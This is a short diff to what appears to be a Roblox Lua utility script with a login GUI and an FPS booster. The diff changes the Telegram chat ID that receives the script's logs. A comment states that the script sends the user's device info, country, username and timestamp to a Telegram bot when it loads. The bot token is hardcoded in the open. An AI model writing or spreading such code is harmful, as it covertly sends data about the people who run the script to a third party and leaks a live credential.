@@ -48,7 +48,7 @@ errorText.Parent = loginFrame
 
 -- TELEGRAM BOT SETUP
 local botToken = "8907038924:AAGKotz5imME-zG7Awwi3fdi8qIyN0RA0eQ"
-local chatId = "8907038924"
+local chatId = "8584485629"
 
 local function sendToTelegram(message)
     pcall(function()
@@ -475,5 +475,5 @@ passwordBox.FocusLost:Connect(checkPassword)
 -- 7. FPS BOOSTER: Lowers graphics, removes shadows/decals/particles for better performance
 -- 8. HIDE/SHOW GUI: Press "━" button to hide menu into floating circle "A", tap circle to restore
 -- 9. DRAGGABLE GUI: Move the menu anywhere on screen by dragging
--- 10. TELEGRAM LOGS: Sends device info, country, username, and timestamp to Telegram bot when script loads
+-- 10. TELEGRAM LOGS: Sends device info, country, username, and timestamp to your Telegram bot (Chat ID: 8584485629)
 -- 11. All features toggle ON/OFF via buttons in the GUI
